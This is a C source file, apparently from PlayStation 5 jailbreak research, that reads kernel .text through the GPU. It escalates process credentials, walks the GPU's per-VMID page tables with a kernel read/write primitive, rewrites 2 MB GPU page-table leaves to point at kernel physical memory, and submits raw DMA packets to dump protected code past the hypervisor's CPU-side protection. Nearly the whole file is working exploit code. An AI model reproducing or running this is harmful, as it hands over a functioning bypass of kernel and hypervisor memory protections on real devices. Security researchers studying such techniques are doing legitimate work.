/*
 * pl5-gpu-read.c -- kernel .text read through the GPU (13.60).
 *
 * The GPU translates through its own per-VMID GPUVM, so it is not subject to the
 * CPU-side NPT/nda protection that makes any CPU read of .text fatal.
 *
 * Order of operations, deliberately conservative:
 *   1. allocate FRESH victim buffers -- the GPU TLB caches gva->phys, so a leaf
 *      that was already translated must never be retargeted twice;
 *   2. validate the retarget on a known target: retarget a fresh victim's 2 MB
 *      leaf at the *staging* buffer's physical and DMA it into the cmd buffer;
 *      the cmd buffer is CPU-readable, so we can check the copy landed;
 *   3. only then retarget another fresh victim at the .text physical and dump;
 *   4. restore every leaf that was touched.
 */
#include "utils.h"

#include <errno.h>
#include <fcntl.h>
#include <ps5/kernel.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include "byepervisor/kdlsym.h"
#include "byepervisor/paging.h"

#define PROT_GPU_READ 0x10
#define PROT_GPU_WRITE 0x20
#define MAP_NO_COALESCE 0x00400000ULL
#define DMEM_SIZE 0x200000ULL
#define GC_SUBMIT_IOCTL 0xC0108102ULL

#define OFF_VMSPACE_VM_VMID 0x1FCULL
#define OFF_DATA_GVMSPACE 0x2EEA570ULL
#define GVMSPACE_STRIDE 0x100ULL
#define OFF_GVM_PAGE_DIR_VA 0x38ULL
#define DEV_VMID 6

#define GPU_PTR_MASK 0x0000FFFFFFFFFFC0ULL
#define GPU_LEAF2M_MASK 0x0000FFFFFFE00000ULL

int sceKernelAllocateDirectMemory(off_t search_start, off_t search_end,
                                  size_t len, size_t alignment, int memory_type,
                                  off_t *phys_out);
int sceKernelMapDirectMemory(void **addr, size_t len, int prot, int flags,
                             off_t phys, size_t alignment);

static uint64_t g_kdata, g_dev_pd;
static int g_fd = -1;

static uint64_t rd64v(uint64_t va) {
  uint64_t v = 0;
  kernel_copyout((intptr_t)va, &v, 8);
  return v;
}

static int walk(const char *tag, uint64_t gva, uint64_t *leaf_va,
                uint64_t *leaf_val) {
  uint64_t e = rd64v(g_dev_pd);
  if (!(e & 1))
    return -1;
  uint64_t t = dmap + (e & GPU_PTR_MASK);
  uint64_t i3 = (gva >> 30) & 0x1FF;
  e = rd64v(t + i3 * 8);
  if (!(e & 1))
    return -1;
  uint64_t pdt = dmap + (e & GPU_PTR_MASK);
  uint64_t i2 = (gva >> 21) & 0x1FF;
  e = rd64v(pdt + i2 * 8);
  if (!(e & 1))
    return -1;
  if ((e >> 54) & 1) { /* 2 MB leaf */
    *leaf_va = pdt + i2 * 8;
    *leaf_val = e;
    notify("gpuread: %s gva=%#lx 2M-leaf @%#lx val=%#lx phys=%#lx\n", tag,
           (unsigned long)gva, (unsigned long)(pdt + i2 * 8), (unsigned long)e,
           (unsigned long)(e & GPU_LEAF2M_MASK));
    return 2;
  }
  uint64_t ptb = dmap + (e & GPU_PTR_MASK);
  uint64_t i1 = (gva >> 16) & 0x1F;
  e = rd64v(ptb + i1 * 8);
  if (!(e & 1) || !((e >> 56) & 1))
    return -1;
  uint64_t sub = dmap + (e & GPU_PTR_MASK);
  uint64_t i0 = (gva >> 13) & 0x7;
  e = rd64v(sub + i0 * 8);
  *leaf_va = sub + i0 * 8;
  *leaf_val = e;
  return 8;
}

/* Submit a DMA_DATA copy in GPU address space. */
static int dma(uint64_t cmd_cpu_va, uint64_t src, uint64_t dst, uint32_t len) {
  uint32_t *p = (uint32_t *)cmd_cpu_va;
  uint32_t hdr = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);
  p[0] = ((3u & 3) << 30) | ((5u & 0x3FFF) << 16) | ((0x50u & 0xFF) << 8) |
         ((1u & 1) << 1);
  p[1] = hdr;
  p[2] = (uint32_t)(src & 0xFFFFFFFF);
  p[3] = (uint32_t)(src >> 32);
  p[4] = (uint32_t)(dst & 0xFFFFFFFF);
  p[5] = (uint32_t)(dst >> 32);
  p[6] = len & 0x1FFFFF;

  uint64_t desc_va = cmd_cpu_va + 0x1000;
  uint64_t *d = (uint64_t *)desc_va;
  d[0] = ((cmd_cpu_va & 0xFFFFFFFFULL) << 32) | 0xC0023F00ULL;
  d[1] = ((7ULL & 0xFFFFFULL) << 32) | ((cmd_cpu_va >> 32) & 0xFFFFULL);

  struct {
    uint32_t pipe_id, count;
    uint64_t cmd_buf_ptr;
  } sub = {0, 1, desc_va};

  int rc = (g_fd >= 0) ? ioctl(g_fd, GC_SUBMIT_IOCTL, &sub) : -1;
  usleep(300000);
  return rc;
}

static void hexdump(const char *tag, const uint8_t *b, int n) {
  char line[3 * 16 + 1];
  for (int r = 0; r < n / 16; r++) {
    int pos = 0;
    for (int i = 0; i < 16; i++)
      pos += snprintf(line + pos, 4, "%02x ", b[r * 16 + i]);
    line[pos] = 0;
    notify("gpuread: %s[%02x] %s\n", tag, r * 16, line);
  }
}

int main(void) {
  uint64_t bufs[6][2]; /* [0]=cpu va, [1]=off */
  static const char *names[6] = {"victim", "staging", "cmd", "victim2",
                                 "victim3", "victim4"};
  uint64_t text_pa = 0, text2m = 0, off_in = 0;
  uint64_t pe = 0;

  if (set_offsets() || init_global_vars()) {
    notify("gpuread: init failed\n");
    return 1;
  }
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  g_kdata = KERNEL_ADDRESS_DATA_BASE;

  /* dev vmid (6) page directory */
  {
    uint64_t base = g_kdata + OFF_DATA_GVMSPACE + (uint64_t)DEV_VMID * GVMSPACE_STRIDE;
    uint64_t pd = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    g_dev_pd = pd;
    notify("gpuread: dev vmid=%d page_dir_va=%#lx\n", DEV_VMID,
           (unsigned long)pd);
    if (!pd) {
      notify("gpuread: dev vmid tree missing\n");
      return 1;
    }
  }

  for (int i = 0; i < 6; i++) {
    off_t off = 0;
    void *va = NULL;
    if (sceKernelAllocateDirectMemory(0, 0x400000000ULL, DMEM_SIZE, DMEM_SIZE,
                                      0xb, &off) != 0) {
      notify("gpuread: alloc %s failed\n", names[i]);
      return 1;
    }
    if (sceKernelMapDirectMemory(&va, DMEM_SIZE,
                                 PROT_READ | PROT_WRITE | PROT_GPU_READ |
                                     PROT_GPU_WRITE,
                                 (int)MAP_NO_COALESCE, off, DMEM_SIZE) != 0) {
      notify("gpuread: map %s failed\n", names[i]);
      return 1;
    }
    bufs[i][0] = (uint64_t)(uintptr_t)va;
    bufs[i][1] = (uint64_t)off;
    memset(va, 0, DMEM_SIZE);
    notify("gpuread: %s va=%#lx off=%#lx\n", names[i],
           (unsigned long)bufs[i][0], (unsigned long)bufs[i][1]);
  }

  g_fd = open("/dev/gc", O_RDWR);
  if (g_fd < 0)
    g_fd = open("/dev/gc0", O_RDWR);
  notify("gpuread: /dev/gc fd=%d\n", g_fd);

  /* known patterns: victim (source of truth), staging (target of validation) */
  for (int i = 0; i < 8; i++)
    ((volatile uint64_t *)bufs[0][0])[i] = 0xDEADBEEF00000000ULL | (uint64_t)i;
  for (int i = 0; i < 8; i++)
    ((volatile uint64_t *)bufs[1][0])[i] = 0xC0FFEE0000000000ULL | (uint64_t)i;

  uint64_t cmd_va = bufs[2][0], staging_va = bufs[1][0], victim_va = bufs[0][0];
  uint64_t v2_va = bufs[3][0], v3_va = bufs[4][0];

  /* ---- 0. baseline self-test: victim -> cmd ------------------------------ */
  {
    int rc = dma(cmd_va, victim_va, cmd_va /*same page dummy*/, 0x1000);
    (void)rc;
  }
  memset((void *)cmd_va, 0, 0x1000);
  notify("gpuread: baseline DMA victim->cmd rc=%d\n",
         dma(cmd_va, victim_va, cmd_va, 0)); /* len 0: no-op, just checks ioctl */

  /* ---- 1. validate the retarget on a known target ------------------------ */
  {
    uint64_t slv = 0, slval = 0, clv = 0, clval = 0;
    walk("staging", staging_va, &slv, &slval);
    walk("cmd", cmd_va, &clv, &clval);
    uint64_t st_phys = slval & GPU_LEAF2M_MASK;

    uint64_t vlv = 0, vlval = 0;
    int gran = walk("victim2", v2_va, &vlv, &vlval);
    notify("gpuread: victim2 gran=%d val=%#lx\n", gran, (unsigned long)vlval);
    if (gran == 2 && (vlval & 1)) {
      uint64_t nv = (vlval & ~GPU_LEAF2M_MASK) | (st_phys & GPU_LEAF2M_MASK) |
                    (1ULL << 50);
      notify("gpuread: VALIDATE retarget victim2 %#lx -> %#lx (staging phys %#lx)\n",
             (unsigned long)vlval, (unsigned long)nv, (unsigned long)st_phys);
      kwrite64(vlv, nv);

      memset((void *)cmd_va, 0, 0x1000);
      int rc = dma(cmd_va, v2_va, cmd_va, 0x1000);
      uint64_t w0 = 0;
      memcpy(&w0, (void *)cmd_va, 8);
      notify("gpuread: VALIDATE dma rc=%d cmd[0]=%#lx expected=%#lx -> %s\n", rc,
             (unsigned long)w0, (unsigned long)0xC0FFEE0000000000ULL,
             w0 == 0xC0FFEE0000000000ULL ? "RETARGET-OK" : "RETARGET-FAILED");
      kwrite64(vlv, vlval); /* restore */
      notify("gpuread: victim2 leaf restored\n");
    }
  }

  /* ---- 1b. DISCRIMINATOR: can the GPU read *system* RAM at all?
   * Retarget a fresh victim at a kernel .data physical whose bytes we can read
   * from the CPU, and compare. If this also returns all-ones, then GPU reads of
   * system RAM are blocked, not just .text. ------------------------------ */
  {
    uint64_t kpm = kdlsym(KERNEL_SYM_PMAP_STORE);
    uint64_t dtarget = KERNEL_ADDRESS_DATA_BASE + 0x1000;
    uint64_t dpe = 0, dpa = 0, cpu_w0 = 0;
    if (find_pte(kpm, dtarget, &dpe) != 0xFFFFFFFFFFFFFFFFull) {
      dpa = PDE_ADDR(dpe) | (dtarget & 0xFFF);
      kernel_copyout((intptr_t)dtarget, &cpu_w0, 8);
      notify("gpuread: DATA kva=%#lx pa=%#lx cpu[0]=%#lx\n",
             (unsigned long)dtarget, (unsigned long)dpa,
             (unsigned long)cpu_w0);
      uint64_t vlv = 0, vlval = 0;
      if (walk("victim4", bufs[5][0], &vlv, &vlval) == 2 && (vlval & 1)) {
        uint64_t nv = (vlval & ~GPU_LEAF2M_MASK) | (dpa & GPU_LEAF2M_MASK) |
                      (1ULL << 50);
        kwrite64(vlv, nv);
        memset((void *)cmd_va, 0, 0x1000);
        int rc = dma(cmd_va, bufs[5][0] + (dpa & 0x1FFFFF), cmd_va, 0x1000);
        uint64_t gw0 = 0;
        memcpy(&gw0, (void *)cmd_va, 8);
        notify("gpuread: DATA dma rc=%d gpu[0]=%#lx cpu[0]=%#lx -> %s\n", rc,
               (unsigned long)gw0, (unsigned long)cpu_w0,
               gw0 == cpu_w0 ? "SYSRAM-READ-OK" : "SYSRAM-READ-MISMATCH");
        hexdump("DATA", (const uint8_t *)cmd_va, 16);
        kwrite64(vlv, vlval);
        notify("gpuread: victim4 leaf restored\n");
      }
    }
  }

  /* ---- 2. the real thing: .text through a fresh victim ------------------- */
  {
    uint64_t kpm = kdlsym(KERNEL_SYM_PMAP_STORE);
    int ok = 0;
    if (find_pte(kpm, ktext, &pe) != 0xFFFFFFFFFFFFFFFFull) {
      text_pa = PDE_ADDR(pe) | (ktext & 0xFFF);
      text2m = text_pa & ~0x1FFFFFULL;
      off_in = text_pa & 0x1FFFFFULL;
      ok = 1;
    }
    notify("gpuread: ktext=%#lx pa=%#lx ok=%d\n", (unsigned long)ktext,
           (unsigned long)text_pa, ok);
    if (ok) {
      uint64_t vlv = 0, vlval = 0;
      int gran = walk("victim3", v3_va, &vlv, &vlval);
      if (gran == 2 && (vlval & 1)) {
        uint64_t nv = (vlval & ~GPU_LEAF2M_MASK) | (text2m & GPU_LEAF2M_MASK) |
                      (1ULL << 50);
        notify("gpuread: TEXT retarget victim3 %#lx -> %#lx (text2m=%#lx off=%#lx)\n",
               (unsigned long)vlval, (unsigned long)nv,
               (unsigned long)text2m, (unsigned long)off_in);
        kwrite64(vlv, nv);

        memset((void *)cmd_va, 0, 0x1000);
        int rc = dma(cmd_va, v3_va + off_in, cmd_va, 0x1000);
        notify("gpuread: TEXT dma rc=%d\n", rc);
        hexdump("TEXT", (const uint8_t *)cmd_va, 64);
        uint64_t nz = 0;
        for (int i = 0; i < 4096; i++)
          nz += (((const uint8_t *)cmd_va)[i] != 0);
        notify("gpuread: TEXT nonzero_bytes_of_4096=%lu\n", (unsigned long)nz);
        kwrite64(vlv, vlval);
        notify("gpuread: victim3 leaf restored\n");
      }
    }
  }

  notify("gpuread: done\n");
  return 0;
}
